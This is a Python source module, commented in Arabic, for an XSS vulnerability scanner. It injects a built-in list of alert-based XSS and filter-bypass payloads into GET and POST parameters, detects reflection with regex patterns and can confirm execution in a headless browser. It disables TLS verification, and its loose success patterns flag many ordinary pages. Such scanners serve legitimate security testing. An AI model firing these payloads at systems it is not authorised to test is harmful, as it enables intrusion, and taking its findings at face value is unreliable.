
import asyncio
import re
import html
from typing import Dict, List, Optional, Any, Set
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from dataclasses import dataclass

from .base_scanner import BaseScanner, ScanContext, Finding, Severity, Confidence

try:
    from bs4 import BeautifulSoup
    BEAUTIFULSOUP_AVAILABLE = True
except ImportError:
    BEAUTIFULSOUP_AVAILABLE = False

try:
    import httpx
    HTTPX_AVAILABLE = True
except ImportError:
    HTTPX_AVAILABLE = False
    import aiohttp

import logging

logger = logging.getLogger(__name__)


@dataclass
class XSSPayload:
    """حمولة XSS"""
    name: str
    payload: str
    category: str  # reflected, stored, dom
    context: str   # html, attribute, javascript, css
    encoding: str  # none, url, html, base64
    description: str = ""


class XSSScanner(BaseScanner):
    """
    فاحص ثغرات XSS
    
    الميزات:
    - اكتشاف XSS المنعكس (Reflected)
    - اكتشاف XSS المخزن (Stored)
    - اكتشاف XSS في DOM
    - سياقات متعددة (HTML، Attribute، JavaScript، CSS)
    - تقنيات تجاوز متنوعة (WAF bypass)
    - التحقق من التنفيذ الفعلي
    """
    
    # قائمة الحمولات الأساسية
    BASE_PAYLOADS = [
        # HTML Context
        XSSPayload("Basic HTML", "<script>alert('XSS')</script>", "reflected", "html", "none"),
        XSSPayload("HTML Event", '<img src=x onerror=alert("XSS")>', "reflected", "html", "none"),
        XSSPayload("HTML Iframe", '<iframe src="javascript:alert(\'XSS\')">', "reflected", "html", "none"),
        XSSPayload("HTML SVG", '<svg onload=alert("XSS")>', "reflected", "html", "none"),
        XSSPayload("HTML Body", '<body onload=alert("XSS")>', "reflected", "html", "none"),
        
        # Attribute Context
        XSSPayload("Attribute Break", '"><script>alert("XSS")</script>', "reflected", "attribute", "none"),
        XSSPayload("Attribute Event", '" onmouseover=alert("XSS") "', "reflected", "attribute", "none"),
        XSSPayload("Attribute JS", '" autofocus onfocus=alert("XSS") "', "reflected", "attribute", "none"),
        
        # JavaScript Context
        XSSPayload("JS String Break", '";alert("XSS");//', "reflected", "javascript", "none"),
        XSSPayload("JS Template", '${alert("XSS")}', "reflected", "javascript", "none"),
        
        # Encoded Payloads
        XSSPayload("URL Encoded", "%3Cscript%3Ealert('XSS')%3C/script%3E", "reflected", "html", "url"),
        XSSPayload("Double URL Encoded", "%253Cscript%253Ealert('XSS')%253C/script%253E", "reflected", "html", "url"),
        
        # Advanced Bypass
        XSSPayload("Case Insensitive", "<ScRiPt>alert('XSS')</sCrIpT>", "reflected", "html", "none"),
        XSSPayload("No Script Tags", "<img/src=x onerror=alert('XSS')>", "reflected", "html", "none"),
        XSSPayload("JavaScript Protocol", "javascript:alert('XSS')", "reflected", "attribute", "none"),
        XSSPayload("Data Protocol", "data:text/html,<script>alert('XSS')</script>", "reflected", "attribute", "none"),
    ]
    
    # إشارات نجاح XSS
    SUCCESS_INDICATORS = [
        r'<script>.*?alert.*?</script>',
        r'on\w+\s*=',
        r'javascript:',
        r'<img.*?onerror=',
        r'<svg.*?onload=',
        r'<body.*?onload=',
        r'<iframe.*?src=',
    ]
    
    def __init__(
        self,
        rate_limit: float = 2.0,
        timeout: int = 30,
        max_retries: int = 2,
        verify_execution: bool = True,
        custom_payloads: List[XSSPayload] = None
    ):
        super().__init__(
            name="XSSScanner",
            rate_limit=rate_limit,
            timeout=timeout,
            max_retries=max_retries
        )
        self._verify_execution = verify_execution
        self._custom_payloads = custom_payloads or []
        self._session = None
        self._tested_params: Set[str] = set()
    
    async def _get_session(self):
        """الحصول على جلسة HTTP"""
        if not self._session:
            if HTTPX_AVAILABLE:
                self._session = httpx.AsyncClient(
                    timeout=self.timeout,
                    follow_redirects=True,
                    verify=False
                )
            else:
                self._session = aiohttp.ClientSession()
        return self._session
    
    async def can_scan(self, context: ScanContext) -> bool:
        """التحقق من وجود معاملات قابلة للاختبار"""
        url = context.target.url
        
        # استخراج المعاملات من URL
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        # المعاملات في POST data
        post_params = context.target.data or {}
        
        return len(params) > 0 or len(post_params) > 0
    
    async def scan(self, context: ScanContext) -> List[Finding]:
        """تنفيذ فحص XSS"""
        findings = []
        url = context.target.url
        method = context.target.method
        params = context.target.params.copy()
        data = context.target.data.copy() if context.target.data else {}
        
        # استخراج المعاملات من URL
        parsed = urlparse(url)
        query_params = parse_qs(parsed.query)
        
        # دمج جميع المعاملات
        all_params = {}
        for key, values in query_params.items():
            all_params[key] = values[0] if values else ""
        all_params.update(params)
        
        # دمج معاملات POST
        all_post_params = data.copy()
        
        # اختبار كل معامل
        for param_name, param_value in all_params.items():
            if param_name in self._tested_params:
                continue
            self._tested_params.add(param_name)
            
            for payload in self.BASE_PAYLOADS + self._custom_payloads:
                # تطبيق الترميز
                encoded_payload = self._apply_encoding(payload.payload, payload.encoding)
                
                # اختبار في GET parameter
                modified_params = all_params.copy()
                modified_params[param_name] = encoded_payload
                
                test_url = self._build_url(url, modified_params)
                
                finding = await self._test_payload(
                    context=context,
                    url=test_url,
                    param_name=param_name,
                    payload=payload,
                    method="GET"
                )
                
                if finding:
                    findings.append(finding)
                    break  # توقف عن اختبار هذا المعامل إذا تم العثور على ثغرة
        
        # اختبار معاملات POST
        for param_name, param_value in all_post_params.items():
            if f"POST:{param_name}" in self._tested_params:
                continue
            self._tested_params.add(f"POST:{param_name}")
            
            for payload in self.BASE_PAYLOADS + self._custom_payloads:
                encoded_payload = self._apply_encoding(payload.payload, payload.encoding)
                
                modified_data = all_post_params.copy()
                modified_data[param_name] = encoded_payload
                
                finding = await self._test_payload_post(
                    context=context,
                    url=url,
                    param_name=param_name,
                    payload=payload,
                    data=modified_data
                )
                
                if finding:
                    findings.append(finding)
                    break
        
        return findings
    
    async def _test_payload(
        self,
        context: ScanContext,
        url: str,
        param_name: str,
        payload: XSSPayload,
        method: str = "GET"
    ) -> Optional[Finding]:
        """اختبار حمولة واحدة في GET request"""
        session = await self._get_session()
        
        try:
            if HTTPX_AVAILABLE:
                if method == "GET":
                    response = await session.get(url, headers=context.target.headers)
                else:
                    response = await session.post(url, headers=context.target.headers)
            else:
                # aiohttp fallback
                if method == "GET":
                    async with session.get(url, headers=context.target.headers) as resp:
                        response_text = await resp.text()
                        response_url = str(resp.url)
                else:
                    async with session.post(url, headers=context.target.headers, data=context.target.data) as resp:
                        response_text = await resp.text()
                        response_url = str(resp.url)
                response = type('Response', (), {'text': response_text, 'url': response_url})()
            
            # تحليل الاستجابة
            body = response.text if hasattr(response, 'text') else str(response)
            
            # البحث عن إشارات نجاح
            if self._detect_xss_in_response(body, payload.payload):
                # التحقق من التنفيذ الفعلي
                executed = False
                if self._verify_execution:
                    executed = await self._verify_execution_in_browser(url, payload.payload)
                
                confidence = Confidence.HIGH if executed else Confidence.MEDIUM
                
                # إنشاء تقرير
                finding = self.add_finding(
                    vulnerability_type="Cross-Site Scripting (XSS)",
                    severity=Severity.HIGH,
                    confidence=confidence,
                    url=url,
                    parameter=param_name,
                    payload=payload.payload,
                    evidence=f"Payload reflected: {payload.payload[:100]}",
                    description=f"{payload.category} XSS discovered using {payload.name} payload in {payload.context} context",
                    remediation="Use proper output encoding (HTML entity encode, JavaScript escape). Implement Content Security Policy (CSP).",
                    cvss_score=6.1
                )
                return finding
                
        except Exception as e:
            logger.debug(f"Error testing payload: {e}")
        
        return None
    
    async def _test_payload_post(
        self,
        context: ScanContext,
        url: str,
        param_name: str,
        payload: XSSPayload,
        data: Dict[str, str]
    ) -> Optional[Finding]:
        """اختبار حمولة واحدة في POST request"""
        session = await self._get_session()
        
        try:
            if HTTPX_AVAILABLE:
                response = await session.post(url, data=data, headers=context.target.headers)
                body = response.text
            else:
                async with session.post(url, data=data, headers=context.target.headers) as resp:
                    body = await resp.text()
            
            if self._detect_xss_in_response(body, payload.payload):
                finding = self.add_finding(
                    vulnerability_type="Cross-Site Scripting (XSS)",
                    severity=Severity.HIGH,
                    confidence=Confidence.MEDIUM,
                    url=url,
                    parameter=param_name,
                    payload=payload.payload,
                    evidence=f"Payload reflected in POST response",
                    description=f"Stored/Reflected XSS discovered in POST parameter",
                    remediation="Use proper output encoding. Implement Content Security Policy.",
                    cvss_score=6.1
                )
                return finding
                
        except Exception as e:
            logger.debug(f"Error testing POST payload: {e}")
        
        return None
    
    def _detect_xss_in_response(self, response_body: str, payload: str) -> bool:
        """كشف وجود حمولة XSS في الاستجابة"""
        # البحث عن الحمولة نفسها
        if payload in response_body:
            return True
        
        # البحث عن إشارات نجاح XSS
        for pattern in self.SUCCESS_INDICATORS:
            if re.search(pattern, response_body, re.IGNORECASE):
                return True
        
        return False
    
    async def _verify_execution_in_browser(self, url: str, payload: str) -> bool:
        """
        التحقق من تنفيذ XSS فعلياً باستخدام متصفح
        
        يتم استخدام Playwright للتحقق من التنفيذ
        """
        try:
            from playwright.async_api import async_playwright
            
            async with async_playwright() as p:
                browser = await p.chromium.launch(headless=True)
                page = await browser.new_page()
                
                # إعداد مستمع للتنبيهات
                alert_triggered = False
                
                async def handle_dialog(dialog):
                    nonlocal alert_triggered
                    alert_triggered = True
                    await dialog.dismiss()
                
                page.on("dialog", handle_dialog)
                
                # انتظار رسالة console
                console_messages = []
                page.on("console", lambda msg: console_messages.append(msg.text))
                
                # فتح الصفحة
                await page.goto(url, wait_until="networkidle")
                
                # البحث عن إشارات التنفيذ
                executed = alert_triggered or len(console_messages) > 0
                
                await browser.close()
                return executed
                
        except ImportError:
            logger.warning("Playwright not available, skipping execution verification")
            return False
    
    def _apply_encoding(self, payload: str, encoding: str) -> str:
        """تطبيق ترميز على الحمولة"""
        from urllib.parse import quote, quote_plus
        
        if encoding == "url":
            return quote(payload)
        elif encoding == "url_plus":
            return quote_plus(payload)
        elif encoding == "html":
            return html.escape(payload)
        elif encoding == "base64":
            import base64
            return base64.b64encode(payload.encode()).decode()
        else:
            return payload
    
    def _build_url(self, base_url: str, params: Dict[str, str]) -> str:
        """بناء URL مع معاملات"""
        parsed = list(urlparse(base_url))
        current_params = parse_qs(parsed[4])
        
        for key, value in params.items():
            current_params[key] = [value]
        
        parsed[4] = urlencode(current_params, doseq=True)
        return urlunparse(parsed)
    
    def add_custom_payload(self, payload: XSSPayload):
        """إضافة حمولة مخصصة"""
        self._custom_payloads.append(payload)
        logger.info(f"Added custom XSS payload: {payload.name}")
    
    async def close(self):
        """إغلاق الجلسة"""
        if self._session:
            if HTTPX_AVAILABLE:
                await self._session.aclose()
            else:
                await self._session.close()
            self._session = None

